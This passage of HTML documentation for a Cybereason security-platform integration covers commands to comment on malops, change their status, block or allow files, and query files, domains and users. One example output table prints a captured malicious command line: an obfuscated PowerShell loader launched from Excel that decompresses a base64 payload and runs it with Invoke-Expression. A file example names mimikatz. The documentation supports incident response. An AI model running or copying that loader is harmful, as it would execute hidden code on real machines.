            "CreationTime": "2018-04-30T14:05:49",
            "EndTime": "2018-04-30T14:06:22",
            "ImageFile": "powershell.exe",
            "MD5": "92f44e405db16ac55d97e3bfe3b132fa",
            "Malicious": "indifferent",
            "Name": "powershell.exe",
            "OwnerMachine": "ROBERTE-EXCASST",
            "Parent": "excel.exe",
            "ProductName": "Microsoft® Windows® Operating System",
            "SHA1": "04c5d2b4da9a0f3fa8a45702d4256cee42d8c48d",
            "User": "darkcap\\roberte"
        }
    ]
}
</pre>
<h5>Human Readable Output</h5>
<h3>Cybereason Malop Processes</h3>
<table>
<thead>
<tr>
<th>Name</th>
<th>Malicious</th>
<th>Creation Time</th>
<th>End Time</th>
<th>Command Line</th>
<th>Parent</th>
<th>Owner Machine</th>
<th>User</th>
<th>Image File</th>
<th>SHA1</th>
<th>MD5</th>
<th>Company Name</th>
<th>Product Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>powershell.exe</td>
<td>indifferent</td>
<td>2018-04-30T14:05:49</td>
<td>2018-04-30T14:06:22</td>
<td>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('nVRtc9o4EP7Or9jx6GbsCVbMS2mCJzOl0LTcFZoLtOkdw9wIW2AXWXJkGUwo//3W4CP0632xvNLuPs+unhV5hjt4Z9VmAyGGSaq0sa0115KLVpOGQljOHNJ8IeIAMsMMLrwweA5DaR6Mhm+xNjkTPSFUYFd7Iu2FoeZZVoc8lgbC7SR+4ZWxPPliKiWnu/R1+0ErwwPj+P+bS19zZvg0wiV85XKye8boeJEbfkHKsGB9YnZ2xj1tzuzP2w9Ms4Qj1jn4iIUl3Au2uvQ8oQ1DLMN6VzN6tychdtjqve8PPtx//DT8/Y/Po/GXhz8fJ9Ov356+//U3WwQhX66i+MdaJFKlzzoz+WZb7F68RrPVftN5e3Nr0anqR0z3tGY726ktcxmU6BDYZOPsQXOTYx9se4bsZvM5kM2vEfATRpxluebul8UPbDO4kzxxKH7gN/CKhueBy5/htukcXrMb2JNlyd7yG5S2fi4VFhdErjqmwLOrOyDhzF5x42omQ5WAm7AiTjArCelnLlcmcuYHv+JHlv5Fdg57SLUKsNWwn7GS6JwUCIefKyD/HHzgMkQKBbLPUA0VLuxtybf/GY9HXIdK1ILtHA4XAKs9IGOwSXzn+SQGVxjotPHv6srZkwiRjE/WJWCICNwHqArEEAEx8l2jX1Y6RCUj4UO8BBt7njkOnLuOHghbGdbt5vtXC8skCcaNkWfV78kuMzyhY27oE1/0Rcwloif0E8qF64yi6Gwrz7h22QqPrDpYI/USC8Gu29RDVJWkqLiFQJ6jyfADdGjDh6cYq99mMJ46llMjEjFXPsze7ww/yiAtySd0oLZSKBYOmGG2FRmTdq+vG7dN2ujcUI82vJtuu926JtICzKIwCOm45XjihfJkwfWAL2MZH9tKnsEd4ziAheitpgWuRCtLWcDhuHNfXUAGbsqyzEQ6r5Hijqhu95fnwquTtBJJ3Stanufh0vYcf1Y16zGXJk44xeniWqUTrjcxyoWOmM4iJubdbl+lO5ukdfDqMDsN4dwmBYofjVbTdpw6nEHK0jDk8pVAxDop6uXilUOicuPKXOBNH18CdyI4T3FWeKBQijedtucd8O0Kov3hXw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"</td>
<td>excel.exe</td>
<td>ROBERTE-EXCASST</td>
<td>darkcap\roberte</td>
<td>powershell.exe</td>
<td>04c5d2b4da9a0f3fa8a45702d4256cee42d8c48d</td>
<td>92f44e405db16ac55d97e3bfe3b132fa</td>
<td>Microsoft Corporation</td>
<td>Microsoft® Windows® Operating System</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_7892645756931536082294067">8. Add a comment to a malop</h3>
<hr>
<p>Adds a new comment to a malop.</p>
<h5>Base Command</h5>
<p><code>cybereason-add-comment</code></p>
<h5>Input</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 135px;"><strong>Argument Name</strong></th>
<th style="width: 499px;"><strong>Description</strong></th>
<th style="width: 74px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 135px;">comment</td>
<td style="width: 499px;">Comment to add to the malop.</td>
<td style="width: 74px;">Required</td>
</tr>
<tr>
<td style="width: 135px;">malopGuid</td>
<td style="width: 499px;">GUID of the malop to add the comment to. Retrieve the Malop GUID using the <code>cybereason-query-malops</code>.</td>
<td style="width: 74px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<p>There is no context output for this command.</p>
<h5>Command Example</h5>
<pre>!cybereason-add-comment comment=NewComment malopGuid=11.8371241992421952627
</pre>
<h5>Human Readable Output</h5>
<p><code>Comment added successfully</code></p>
<h3 id="h_7664320367841536082302674">9. Update malop status</h3>
<hr>
<p>Updates a malop status.</p>
<h5>Base Command</h5>
<p><code>cybereason-update-malop-status</code></p>
<h5>Input</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 180px;"><strong>Argument Name</strong></th>
<th style="width: 417px;"><strong>Description</strong></th>
<th style="width: 111px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 180px;">malopGuid</td>
<td style="width: 417px;">GUID of the malop to update the status of</td>
<td style="width: 111px;">Required</td>
</tr>
<tr>
<td style="width: 180px;">status</td>
<td style="width: 417px;">Status to update</td>
<td style="width: 111px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 333px;"><strong>Path</strong></th>
<th style="width: 95px;"><strong>Type</strong></th>
<th style="width: 280px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 333px;">Cybereason.Malops.GUID</td>
<td style="width: 95px;">string</td>
<td style="width: 280px;">Malop GUID</td>
</tr>
<tr>
<td style="width: 333px;">Cybereason.Malops.Status</td>
<td style="width: 95px;">string</td>
<td style="width: 280px;">
<p>Malop status:</p>
<ul>
<li>To Review</li>
<li>Unread</li>
<li>Remediated</li>
<li>Not Relevant</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-update-malop-status malopGuid=11.8371241992421952627 status="To Review"
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
      "Malops":
        "GUID": "11.8371241992421952627",
        "Status": "To Review"
       }
    }
}
</pre>
<h5>Human Readable Output</h5>
<p><code>Successfully updated malop 11.8371241992421952627 to status To Review</code></p>
<h3 id="h_550371171841544433914048">10. Prevent a malop process file </h3>
<hr>
<p>Prevent malop process file from running on the machine.</p>
<h5>Base Command</h5>
<p><code>cybereason-prevent-file</code></p>
<h5>Input</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 201px;"><strong>Argument Name</strong></th>
<th style="width: 381px;"><strong>Description</strong></th>
<th style="width: 126px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 201px;">hash</td>
<td style="width: 381px;">MD5 of the malop process file to prevent</td>
<td style="width: 126px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 163px;"><strong>Path</strong></th>
<th style="width: 91px;"><strong>Type</strong></th>
<th style="width: 453px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 163px;">Process.MD5</td>
<td style="width: 91px;">string</td>
<td style="width: 453px;">Process file MD5</td>
</tr>
<tr>
<td style="width: 163px;">Process.Prevent</td>
<td style="width: 91px;">boolean</td>
<td style="width: 453px;">True if process file is prevented</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-prevent-file hash=6fb065fcff8d92da51bba667dc9f770c
</pre>
<h5>Context Example</h5>
<pre>{
  "Process": {
    "MD5": "6fb065fcff8d92da51bba667dc9f770c",
    "Prevent": true
  }
}
</pre>
<h5>Human Readable Output</h5>
<p><code>File was prevented successfully.</code></p>
<h3 id="h_3189997752931544433919989">11. Allow a malop process file</h3>
<hr>
<p>Allow a malop process file to run on the machine.</p>
<h5>Base Command</h5>
<p><code>cybereason-unprevent-file</code></p>
<h5>Input</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 176px;"><strong>Argument Name</strong></th>
<th style="width: 423px;"><strong>Description</strong></th>
<th style="width: 108px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 176px;">hash</td>
<td style="width: 423px;">MD5 of the malop process file to allow</td>
<td style="width: 108px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 750px;">
<thead>
<tr>
<th style="width: 201px;"><strong>Path</strong></th>
<th style="width: 106px;"><strong>Type</strong></th>
<th style="width: 401px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 201px;">Process.MD5</td>
<td style="width: 106px;">string</td>
<td style="width: 401px;">Process file MD5</td>
</tr>
<tr>
<td style="width: 201px;">Process.Prevent</td>
<td style="width: 106px;">boolean</td>
<td style="width: 401px;">True if process file is prevented</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-unprevent-file hash=6fb065fcff8d92da51bba667dc9f770c
</pre>
<h5>Context Example</h5>
<pre>{
  "Process": {
    "MD5": "6fb065fcff8d92da51bba667dc9f770c",
    "Prevent": false
  }
}
</pre>
<h5>Human Readable Output</h5>
<p><code>File was unprevented successfully.</code></p>
<h3 id="h_163523643981546507570294">12. Get information for a file</h3>
<hr>
<p>Query files as part of investigation.</p>
<h5>Base Command</h5>
<p><code>cybereason-query-file</code></p>
<h5>Input</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 202px;"><strong>Argument Name</strong></th>
<th style="width: 424px;"><strong>Description</strong></th>
<th style="width: 114px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 202px;">file_hash</td>
<td style="width: 424px;">File hash (SHA-1 and MD5 supported)</td>
<td style="width: 114px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 233px;"><strong>Path</strong></th>
<th style="width: 64px;"><strong>Type</strong></th>
<th style="width: 443px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 233px;">Cybereason.File.Path</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File path</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.SHA1</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File SHA-1 hash</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Machine</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">Machine name on which file is located</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.SuspicionsCount</td>
<td style="width: 64px;">number</td>
<td style="width: 443px;">File suspicions count</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Name</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File name</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.CreationTime</td>
<td style="width: 64px;">date</td>
<td style="width: 443px;">File creation time</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Suspicion</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File suspicions object of suspicion as key and detected date as value</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.OSVersion</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">Machine OS version on which the file is located</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.ModifiedTime</td>
<td style="width: 64px;">date</td>
<td style="width: 443px;">File modified date</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Malicious</td>
<td style="width: 64px;">boolean</td>
<td style="width: 443px;">Is file malicious</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Company</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">Company name</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.MD5</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File MD5 hash</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.IsConnected</td>
<td style="width: 64px;">boolean</td>
<td style="width: 443px;">Is machine connected to Cybereason</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Signed</td>
<td style="width: 64px;">boolean</td>
<td style="width: 443px;">Is file signed</td>
</tr>
<tr>
<td style="width: 233px;">Cybereason.File.Evidence</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File evidences</td>
</tr>
<tr>
<td style="width: 233px;">Endpoint.Hostname</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">Hostname on which file is located</td>
</tr>
<tr>
<td style="width: 233px;">Endpoint.OSVersion</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">Machine OS version on which the file is located</td>
</tr>
<tr>
<td style="width: 233px;">File.Hostname</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">Hostname on which file is located</td>
</tr>
<tr>
<td style="width: 233px;">File.MD5</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File MD5 hash</td>
</tr>
<tr>
<td style="width: 233px;">File.SHA1</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File SHA-1 hash</td>
</tr>
<tr>
<td style="width: 233px;">File.Name</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File name</td>
</tr>
<tr>
<td style="width: 233px;">File.Path</td>
<td style="width: 64px;">string</td>
<td style="width: 443px;">File path</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-query-file file_hash=d40a48094c1f21fef892f27a8b6a7ed2bbf0c27f
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
        "File": [
        {
            "Company": "company",
            "CreationTime": "2018-09-25T20:10:38.000Z",
            "Evidence": [
                "mimikatzResourceEvidence",
                "reportedByAntiMalwareEvidence",
                "malwareClassificationEvidence",
                "hasLegitClassificationEvidence",
                "hasNonLegitClassificationEvidence",
                "whitelistClassificationEvidence"
            ],
            "IsConnected": false,
            "MD5": "b5962945811f8d275a3a69334dbc81e8",
            "Machine": "DESKTOP-UNQ8LCD",
            "Malicious": false,
            "ModifiedTime": "2018-11-14T20:02:34.000Z",
            "Name": "mimikatz.exe",
            "OSVersion": "Windows_10",
            "Path": "c:\\users\\user\\downloads\\mimikatz_trunk\\x64\\mimikatz.exe",
            "SHA1": "d40a48094c1f21fef892f27a8b6a7ed2bbf0c27f",
            "Signed": true,
            "Suspicion": {
                "fileReputationSuspicion": "2018-11-14T20:02:52.000Z",
                "mimikatzSuspicion": "2018-11-14T20:02:52.000Z",
                "reportedByAntiMalwareSuspicion": "2018-11-27T20:56:54.000Z"
            },
            "SuspicionsCount": 3
        }
    ]
    },
    "Endpoint": [
        {
            "Hostname": "DESKTOP-UNQ8LCD",
            "OSVersion": "Windows_10"
        }
    ],
    "File": [
        {
            "Hostname": "DESKTOP-UNQ8LCD",
            "MD5": "b5962945811f8d275a3a69334dbc81e8",
            "Name": "mimikatz.exe",
            "Path": "c:\\users\\user\\downloads\\mimikatz_trunk\\x64\\mimikatz.exe",
            "SHA1": "d40a48094c1f21fef892f27a8b6a7ed2bbf0c27f"
        }
    ]
}
</pre>
<h5>Human Readable Output</h5>
<p><a href="https://user-images.githubusercontent.com/31018228/50557121-9b5db100-0cea-11e9-9d81-54e59755018b.png" target="_blank" rel="noopener noreferrer"><img src="https://user-images.githubusercontent.com/31018228/50557121-9b5db100-0cea-11e9-9d81-54e59755018b.png" alt="image"></a></p>
<h3 id="h_2651126022221546507576262">13. Get information for a domain</h3>
<hr>
<p>Query domains as part of investigation.</p>
<h5>Base Command</h5>
<p><code>cybereason-query-domain</code></p>
<h5>Input</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 289px;"><strong>Argument Name</strong></th>
<th style="width: 284px;"><strong>Description</strong></th>
<th style="width: 167px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 289px;">domain</td>
<td style="width: 284px;">Domain to query</td>
<td style="width: 167px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 437px;"><strong>Path</strong></th>
<th style="width: 59px;"><strong>Type</strong></th>
<th style="width: 244px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 437px;">Cybereason.Domain.Name</td>
<td style="width: 59px;">string</td>
<td style="width: 244px;">Domain name</td>
</tr>
<tr>
<td style="width: 437px;">Cybereason.Domain.Malicious</td>
<td style="width: 59px;">boolean</td>
<td style="width: 244px;">Is domain malicious</td>
</tr>
<tr>
<td style="width: 437px;">Cybereason.Domain.IsInternalDomain</td>
<td style="width: 59px;">boolean</td>
<td style="width: 244px;">Is domain internal</td>
</tr>
<tr>
<td style="width: 437px;">Cybereason.Domain.Reputation</td>
<td style="width: 59px;">string</td>
<td style="width: 244px;">Domain reputation</td>
</tr>
<tr>
<td style="width: 437px;">Cybereason.Domain.SuspicionsCount</td>
<td style="width: 59px;">number</td>
<td style="width: 244px;">Domain suspicions count</td>
</tr>
<tr>
<td style="width: 437px;">Cybereason.Domain.WasEverResolved</td>
<td style="width: 59px;">boolean</td>
<td style="width: 244px;">Was domain ever resolved</td>
</tr>
<tr>
<td style="width: 437px;">Cybereason.Domain.WasEverResolvedAsASecondLevelDomain</td>
<td style="width: 59px;">boolean</td>
<td style="width: 244px;">Was domain ever resolved as a second-level domain</td>
</tr>
<tr>
<td style="width: 437px;">Domain.Name</td>
<td style="width: 59px;">string</td>
<td style="width: 244px;">Domain name</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-query-domain domain=www2.bing.com
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
     "Domain": [
        {
            "IsInternalDomain": false,
            "Malicious": false,
            "Name": "www2.bing.com",
            "Reputation": "indifferent",
            "SuspicionsCount": 0,
            "WasEverResolved": true,
            "WasEverResolvedAsASecondLevelDomain": true
        }
    ],
    "Domain": [
        {
            "Name": "www2.bing.com"
        }
    ]
  }
}
</pre>
<h5>Human Readable Output</h5>
<p><a href="https://user-images.githubusercontent.com/31018228/50558033-3bb7d380-0cf3-11e9-9b46-2f37a05419a2.png" target="_blank" rel="noopener noreferrer"><img src="https://user-images.githubusercontent.com/31018228/50558033-3bb7d380-0cf3-11e9-9b46-2f37a05419a2.png" alt="image"></a></p>
<h3 id="h_2362030334611546507584634">14. Get information for a user</h3>
<hr>
<p>Query users as part of investigation.</p>
<h5>Base Command</h5>
<p><code>cybereason-query-user</code></p>
<h5>Input</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 274px;"><strong>Argument Name</strong></th>
<th style="width: 308px;"><strong>Description</strong></th>
<th style="width: 158px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 274px;">username</td>
<td style="width: 308px;">Username to query</td>
<td style="width: 158px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 347px;"><strong>Path</strong></th>
<th style="width: 75px;"><strong>Type</strong></th>
<th style="width: 318px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 347px;">Cybereason.User.Username</td>
<td style="width: 75px;">string</td>
<td style="width: 318px;">User name</td>
</tr>
<tr>
<td style="width: 347px;">Cybereason.User.Domain</td>
<td style="width: 75px;">string</td>
<td style="width: 318px;">User domain</td>
</tr>
<tr>
<td style="width: 347px;">Cybereason.User.LastMachineLoggedInTo</td>
<td style="width: 75px;">string</td>
<td style="width: 318px;">Last machine the user logged in to</td>
</tr>
<tr>
<td style="width: 347px;">Cybereason.User.LocalSystem</td>
<td style="width: 75px;">boolean</td>
<td style="width: 318px;">Is local system</td>
</tr>
<tr>
<td style="width: 347px;">Cybereason.User.Organization</td>
<td style="width: 75px;">string</td>
<td style="width: 318px;">User organization</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-query-user username="ec2amaz-5man2hc\\network service"
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
     "User": [
        {
            "Domain": "ec2amaz-5man2hc",
            "LastMachineLoggedInTo": "EC2AMAZ-5MAN2HC",
            "LocalSystem": true,
            "Organization": "INTEGRATION",
            "Username": "ec2amaz-5man2hc\\network service"
        }
    ]
  }
}
</pre>
<h5>Human Readable Output</h5>
<p><a href="https://user-images.githubusercontent.com/31018228/50557070-3a35dd80-0cea-11e9-954d-56c9978d50fa.png" target="_blank" rel="noopener noreferrer"><img src="https://user-images.githubusercontent.com/31018228/50557070-3a35dd80-0cea-11e9-954d-56c9978d50fa.png" alt="image"></a></p>
